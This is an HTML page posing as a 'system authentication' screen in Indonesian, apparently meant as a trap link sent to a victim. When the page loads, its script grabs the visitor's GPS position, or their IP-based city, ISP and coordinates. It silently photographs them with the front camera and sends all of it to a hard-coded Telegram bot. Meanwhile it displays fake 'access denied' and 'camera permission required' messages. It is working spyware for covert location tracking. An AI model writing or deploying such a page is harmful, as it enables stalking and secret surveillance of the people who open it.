
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEM AUTHENTICATION</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .con { text-align: center; border: 1px solid #0f0; padding: 20px; width: 85%; box-shadow: 0 0 15px #0f0; }
    </style>
</head>
<body>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<div class="con">
    <div id="status">> MENGHUBUNGKAN KE SERVER...</div>
    <p id="info" style="font-size: 12px; color: #080;">ID: 837-TRAP-SYSTEM</p>
</div>

<script>
    const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
    const chatId = "8465963357";

    async function sendToTele(text) {
        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
        });
    }

    async function snap() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;
            await v.play();
            setTimeout(() => {
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', b, 'target.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                document.getElementById('status').innerText = "> AKSES DITOLAK: DEVICE TIDAK DIKENAL.";
            }, 1000);
        } catch (e) {
            document.getElementById('status').innerText = "> ERROR: IZIN KAMERA DIBUTUHKAN.";
        }
    }

    async function run() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const msg = `🎯 **LOKASI GPS (PRESISI)**\n📍 Lat: ${p.coords.latitude}\n📍 Lon: ${p.coords.longitude}\n📏 Akurasi: ${p.coords.accuracy.toFixed(1)}m\n🗺️ Maps: https://www.google.com/maps?q=$$${p.coords.latitude},${p.coords.longitude}`;
                await sendToTele(msg);
                snap();
            }, async () => {
                // Fallback IP jika GPS ditolak
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const msg = `⚠️ **GPS DITOLAK (LOKASI IP)**\n🏙️ Kota: ${d.city}\n📡 ISP: ${d.org}\n📍 Koordinat: ${d.latitude}, ${d.longitude}`;
                await sendToTele(msg);
                snap();
            }, {enableHighAccuracy: true, timeout: 5000});
        }
    }

    window.onload = run;
</script>
</body>
</html>
